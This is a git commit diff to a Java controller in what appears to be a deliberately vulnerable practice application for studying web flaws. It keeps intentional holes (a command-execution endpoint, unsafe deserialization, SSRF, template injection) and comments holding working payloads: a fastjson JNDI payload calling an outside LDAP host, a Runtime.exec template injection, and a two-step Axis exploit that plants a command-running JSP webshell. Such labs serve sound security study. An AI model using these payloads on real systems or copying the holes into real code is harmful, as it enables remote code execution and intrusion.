79a760b80c60c66bd4cf224c1cd7aafbe20bcc62
novy <45167857+novysodope@users.noreply.github.com>
2021-08-02 15:56:23 +0800

    Update TestController.java
    垃圾桶

--- src/main/java/controller/TestController.java
+++ src/main/java/controller/TestController.java
@@ -25,11 +25,13 @@ import javax.servlet.http.HttpServletResponse;
 @Slf4j
 @RestController
 public class TestController extends HttpServlet {
+    private SerializeUtil fvlh;
+    private String a = "";
     Logger log = LoggerFactory.getLogger(TestController.class);
 /****************************************************fastjson反序列化漏洞**********************************************************************/
     /**
      * 启动rmi服务：java -jar RogueJndi-1.0.jar -n 起服务的ip -c 要执行的命令
-     * payload：{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.83.11:1389/o=tomcat","autoCommit":true}}
+     * payload：{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.83.11:1389/o=tomcat","autoCommit":true}}";
      * 如果是get请求就编码（HTML）payload，POST则不用
      **/
     @RequestMapping(value = "/test")
@@ -37,6 +39,7 @@ public class TestController extends HttpServlet {
         JSONObject data = JSONObject.parseObject(dataStr);
         return dataStr;
     }
+
     /****************************************************spring boot Thymeleaf模板注入****************************************************************
      * https://novysodope.github.io/2020/10/10/31/
      * ***/
@@ -60,7 +63,8 @@ public class TestController extends HttpServlet {
     public String fragment(@RequestParam String section) {
         return "welcome :: " + section; //fragment is tainted
     }
-///doc/__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
+
+    ///doc/__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
     @GetMapping("/doc/{document}")
     public void getDocument(@PathVariable String document) {
         log.info("Retrieving " + document);
@@ -81,35 +85,62 @@ public class TestController extends HttpServlet {
     @GetMapping("/safe/doc/{document}")
     public void getDocument(@PathVariable String document, HttpServletResponse response) {
         log.info("Retrieving " + document); //FP
+
     }
 /*************************************************原生反序列化漏洞************************************************************************/
     /**
-     *使用打包的ysoserial生成一个二进制文件：java -jar ysoserial-master.jar 指定一个ysoserial里payload的类名 要执行的命令 > 1.txt
+     * 使用打包的ysoserial生成一个二进制文件：java -jar ysoserial-master.jar 指定一个ysoserial里payload的类名 要执行的命令 > 1.txt
      * 使用burpsuite发送二进制文件：右键选择Paste from file,选择刚刚生成的文件
      **/
     @PostMapping(value = "/deserialize")
+
+
     public void deserialize(HttpServletRequest request) throws Exception {
-        ServletInputStream inputStream = request.getInputStream();
-        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
-        objectInputStream.readObject();
-        objectInputStream.close();
+        fvlh.deserialize(request);
     }
-/*******************************************************命令执行******************************************************************/
+
+
+    /*******************************************************命令执行******************************************************************/
 
     @RequestMapping(value = "/rce")
-    public void rce(HttpServletRequest req) throws  Exception{
+    public void rce(HttpServletRequest req) throws Exception {
         String cmd = req.getParameter("cmd");
         Runtime.getRuntime().exec(cmd);
     }
-/********************************************************javamelody XXE漏洞*****************************************************************/
+    /*******************************************************权限绕过测试*********************************************/
+    @RequestMapping(value="/req/login",params = "test")
+    //doGet,doPost
+    public void req(HttpServletRequest request,HttpServletResponse response) throws Exception{
+        String uri = request.getRequestURI();
+        StringBuffer url = request.getRequestURL();
+        String path = request.getContextPath();
+        String servlet = request.getServletPath();
+       // System.out.println(uri);
+        if (uri.contains("/req/login")){
+            //Javaweb response响应用法
+            response.setContentType("text/html;charset=utf-8");
+            PrintWriter out = response.getWriter();
+            out.println("<br>getRequestURI：" + uri);
+            out.println("<br>getRequestURL:" + url);
+            out.println("<br>getContextPath:" + path);
+            out.println("<br>getServletPath:" + servlet);
+        }else {
+            if (!uri.contains("/req/login"))
+            response.setContentType("text/html;charset=utf-8");
+            PrintWriter out = response.getWriter();
+            out.println("ERROR");
+        }
+    }
+    /********************************************************javamelody XXE漏洞*****************************************************************/
 
-    public void javamelody_xxe(){
+    public void javamelody_xxe() {
         System.out.println("javamelody xxe");
     }
-/***********************************************************SSRF**************************************************************/
+
+    /***********************************************************SSRF**************************************************************/
 
     @RequestMapping(value = "/ssrf")
-    public void readfile(HttpServletRequest req, HttpServletResponse response) throws Exception{
+    public void readfile(HttpServletRequest req, HttpServletResponse response) throws Exception {
         String path = req.getParameter("path");
         String bcontent;
 
@@ -117,7 +148,7 @@ public class TestController extends HttpServlet {
         URLConnection urlConnection = ssrf.openConnection();
         BufferedReader a = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
         StringBuffer b = new StringBuffer();
-        while ((bcontent = a.readLine())!=null){
+        while ((bcontent = a.readLine()) != null) {
             b.append(bcontent);
         }
         a.close();
@@ -127,58 +158,59 @@ public class TestController extends HttpServlet {
         outputStream.close();
     }
 /***************************************************axis远程命令执行**********************************************************************/
-/**
- * 如果提示no SOAPAction header!那就在头部添加SOAPAction: something
- * 第一次请求：
- * POST /services/AdminService
- * SOAPAction: something
- *
- * <?xml version="1.0" encoding="utf-8"?>
- * <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
- *         xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
- *         xmlns:xsd="http://www.w3.org/2001/XMLSchema"
- *         xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
- *   <soapenv:Body>
- *     <ns1:deployment
- *   xmlns="http://xml.apache.org/axis/wsdd/"
- *   xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
- *   xmlns:ns1="http://xml.apache.org/axis/wsdd/">
- *   <ns1:service name="RandomService" provider="java:RPC">
- *     <requestFlow>
- *       <handler type="RandomLog"/>
- *     </requestFlow>
- *     <ns1:parameter name="className" value="java.util.Random"/>
- *     <ns1:parameter name="allowedMethods" value="*"/>
- *   </ns1:service>
- *   <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >
- *     <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />
- *     <parameter name="LogHandler.writeToConsole" value="false" />
- *   </handler>
- * </ns1:deployment>
- *   </soapenv:Body>
- * </soapenv:Envelope>
- * 第二次请求写shell内容：
- * POST /services/RandomService
- * SOAPAction: something
- *
- * <?xml version="1.0" encoding="utf-8"?>
- *         <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
- *         xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
- *         xmlns:xsd="http://www.w3.org/2001/XMLSchema"
- *         xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
- *         <soapenv:Body>
- *         <api:main
- *         soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
- *             <api:in0><![CDATA[
- * <%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
- * ]]>
- *             </api:in0>
- *         </api:main>
- *   </soapenv:Body>
- * </soapenv:Envelope>
- * 得到webshell http://localhost/shell.jsp**/
-    public void axis(){
+    /**
+     * 如果提示no SOAPAction header!那就在头部添加SOAPAction: something
+     * 第一次请求：
+     * POST /services/AdminService
+     * SOAPAction: something
+     * <p>
+     * <?xml version="1.0" encoding="utf-8"?>
+     * <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+     * xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+     * xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+     * xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+     * <soapenv:Body>
+     * <ns1:deployment
+     * xmlns="http://xml.apache.org/axis/wsdd/"
+     * xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
+     * xmlns:ns1="http://xml.apache.org/axis/wsdd/">
+     * <ns1:service name="RandomService" provider="java:RPC">
+     * <requestFlow>
+     * <handler type="RandomLog"/>
+     * </requestFlow>
+     * <ns1:parameter name="className" value="java.util.Random"/>
+     * <ns1:parameter name="allowedMethods" value="*"/>
+     * </ns1:service>
+     * <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >
+     * <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />
+     * <parameter name="LogHandler.writeToConsole" value="false" />
+     * </handler>
+     * </ns1:deployment>
+     * </soapenv:Body>
+     * </soapenv:Envelope>
+     * 第二次请求写shell内容：
+     * POST /services/RandomService
+     * SOAPAction: something
+     * <p>
+     * <?xml version="1.0" encoding="utf-8"?>
+     * <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+     * xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
+     * xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+     * xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+     * <soapenv:Body>
+     * <api:main
+     * soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+     * <api:in0><![CDATA[
+     * <%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
+     * ]]>
+     * </api:in0>
+     * </api:main>
+     * </soapenv:Body>
+     * </soapenv:Envelope>
+     * 得到webshell http://localhost/shell.jsp
+     **/
+    public void axis() {
         System.out.println("Axis CVE-2019-0227 远程命令执行");
-}
+    }
 }
 
